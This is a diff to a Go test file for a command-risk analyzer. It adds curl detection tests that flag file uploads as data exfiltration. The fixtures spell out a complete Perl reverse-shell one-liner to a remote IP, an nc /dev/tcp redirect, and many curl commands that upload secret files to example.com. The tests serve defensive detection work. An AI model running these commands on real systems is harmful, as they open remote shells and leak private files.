@@ -29,6 +29,7 @@ var (
 	_ libcommand.Command = analysis.Shell
 	_ libcommand.Command = analysis.Python
 	_ libcommand.Command = analysis.Perl
+	_ libcommand.Command = analysis.Curl
 )
 
 func TestDetectionErrorReportsRiskType(t *testing.T) {
@@ -94,6 +95,13 @@ func TestCommandsDetectTheirHighRiskInvocations(t *testing.T) {
 			source:      `perl -e 'use Socket;$i="198.51.100.42";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'`,
 			riskType:    "reverse_shell",
 		},
+		{
+			name:        "curl uploads file",
+			commandName: "curl",
+			command:     analysis.Curl,
+			source:      `curl --upload-file ./secret.txt https://example.com/upload`,
+			riskType:    "data_exfiltration",
+		},
 	}
 
 	for _, test := range tests {
@@ -117,6 +125,38 @@ func TestOnlyRegisteredAnalysisCommandsAreEnabled(t *testing.T) {
 	err := simulate(t, `poweroff`, map[string]libcommand.Command{"rm": analysis.RM})
 	if err != nil {
 		t.Fatalf("unregistered poweroff analysis returned %v", err)
+	}
+}
+
+func TestCurlDetectsFileBackedUploads(t *testing.T) {
+	tests := []*struct {
+		name   string
+		source string
+	}{
+		{name: "short upload file", source: `curl -T ./secret.txt https://example.com/upload`},
+		{name: "attached short upload file", source: `curl -T./secret.txt https://example.com/upload`},
+		{name: "long upload file", source: `curl --upload-file=./secret.txt https://example.com/upload`},
+		{name: "data file", source: `curl --data @./secret.txt https://example.com/upload`},
+		{name: "binary data file", source: `curl --data-binary=@./secret.bin https://example.com/upload`},
+		{name: "JSON file", source: `curl --json @./secret.json https://example.com/upload`},
+		{name: "multipart file", source: `curl -F attachment=@./secret.txt https://example.com/upload`},
+		{name: "multipart file contents", source: `curl --form 'attachment=<./secret.txt' https://example.com/upload`},
+		{name: "URL encoded file", source: `curl --data-urlencode field@./secret.txt https://example.com/upload`},
+		{name: "stdin upload", source: `cat ./secret.txt | curl --upload-file - https://example.com/upload`},
+		{name: "stdin data", source: `cat ./secret.txt | curl --data-binary @- https://example.com/upload`},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			err := simulate(t, test.source, map[string]libcommand.Command{"curl": analysis.Curl})
+			if !errors.Is(err, analysis.ErrRiskDetected) {
+				t.Fatalf("error = %v, want ErrRiskDetected", err)
+			}
+			var detection *analysis.DetectionError
+			if !errors.As(err, &detection) || detection.Command != "curl" || detection.Type != analysis.RiskTypeDataExfiltration {
+				t.Fatalf("detection = %#v, want curl data_exfiltration", detection)
+			}
+		})
 	}
 }
 
@@ -245,6 +285,14 @@ func TestCommandsLeaveSafeAndUnresolvedInvocationsUnresolved(t *testing.T) {
 		{name: "python local shell", commandName: "python3", command: analysis.Python, source: `python3 -c 'import subprocess; subprocess.run(["/bin/bash", "-lc", "echo ok"])'`},
 		{name: "perl network client", commandName: "perl", command: analysis.Perl, source: `perl -e 'use Socket; print "socket support\n";'`},
 		{name: "network redirect alone", commandName: "nc", command: analysis.NC, source: `nc >/dev/tcp/10.0.0.1/4444`},
+		{name: "curl GET", commandName: "curl", command: analysis.Curl, source: `curl https://example.com/file`},
+		{name: "curl inline data", commandName: "curl", command: analysis.Curl, source: `curl --data 'key=value' https://example.com/form`},
+		{name: "curl inline form", commandName: "curl", command: analysis.Curl, source: `curl -F 'key=value' https://example.com/form`},
+		{name: "curl literal form string", commandName: "curl", command: analysis.Curl, source: `curl --form-string 'attachment=@./secret.txt' https://example.com/form`},
+		{name: "curl raw at data", commandName: "curl", command: analysis.Curl, source: `curl --data-raw '@not-a-file' https://example.com/form`},
+		{name: "curl URL encoded literal", commandName: "curl", command: analysis.Curl, source: `curl --data-urlencode 'field=user@example.com' https://example.com/form`},
+		{name: "curl empty upload source", commandName: "curl", command: analysis.Curl, source: `curl --upload-file '' https://example.com/upload`},
+		{name: "curl unresolved upload source", commandName: "curl", command: analysis.Curl, source: `curl --upload-file "$RANDOM" https://example.com/upload`},
 	}
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
